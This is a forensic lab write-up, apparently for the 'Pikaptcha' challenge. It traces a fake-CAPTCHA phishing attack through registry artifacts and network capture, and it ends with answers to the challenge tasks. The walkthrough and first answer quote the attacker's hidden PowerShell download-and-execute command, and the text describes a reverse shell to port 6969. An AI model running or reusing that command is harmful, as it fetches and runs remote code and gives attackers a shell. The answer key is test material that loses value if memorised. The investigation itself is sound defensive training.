# Pikaptcha

Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.

## Data

Extracting the files from `Pikaptcha.zip`, we are given:

- `pikaptcha.pcapng`
- `2024-09-23T052209_alert_mssp_action.zip`

## Walkthrough

The first objective is to analyse the registry of the `happy.grunwald` user to identify the command used to download and execute the stager and the time that it executed. From the triage collection Zip file, we are provided the `NTUSER.DAT` and `UsrClass.dat` files which we can open in Registry Explorer.

From this view, we can see an entry within `Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` which tracks the execution of commands via the Run dialog:

![](Pasted%20image%2020250716214816.png)

The entry shows the user executed a PowerShell command at `2024-09-23 05:07:45`:

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
```

Pivoting to the PCAP, we see two pertinent events between the user's host (`172.17.79.129`) and the attacker's IP at `43.205.115.44`:

```
http and http.request.method==GET and ip.addr==43.205.115.44
```

![](Pasted%20image%2020250716215551.png)

##### (1) HTTP GET to `43.205.115.44`

At `2024-09-23 05:06:16 UTC`, a `HTTP GET` was observed to `http://43.205.115.44/`, rendering the following fake CAPTCHA:

![](Pasted%20image%2020250716215740.png)

##### (2) HTTP GET to `43.205.115.44/office2024install.ps1`

At `2024-09-23 05:07:47 UTC`, a `HTTP GET` was observed to `/office2024install.ps1`, retrieving a PowerShell script:

![](Pasted%20image%2020250716215935.png)

![](Pasted%20image%2020250716220513.png)

From the decoded Base64, we see a `TCPClient` object is defined to connect to `43.205.115.44:6969` as a reverse shell.

Filtering the network capture further, we see the reverse shell was established at `2024-09-23 05:07:48 UTC` and finished at `2024-09-23 05:14:31 UTC` - 403 seconds.

Finally, pivoting back to the initial HTTP GET request that was made, we can see the JavaScript code which copied the PowerShell code to the victim's clipboard:

![](Pasted%20image%2020250716221415.png)

## Tasks

1. It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
```

2. At what time in UTC did the malicious payload execute?

```
2024-09-23 05:07:45
```

3. The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script? 

```
$ echo 'powershell -e JABjA...AKQA=' | sha256sum
```

```
579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de
```

4. To which port did the reverse shell connect?

Obtained by decoding `office2024install.ps1` from Base64; port was contained within a `TCPClient` object.

```
6969
```

5. For how many seconds was the reverse shell connection established between C2 and the victim's workstation?

Obtained through Wireshark filter of `tcp.port==6969 and ip.addr=43.205.115.44` and computed the time.

```
403
```

6. Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?

Extracted HTML from first `HTTP GET` to malicious IP and analysed code, finding `stageClipboard` contained the malicious PowerShell command copied to the victim's clipboard.

```
stageClipboard
```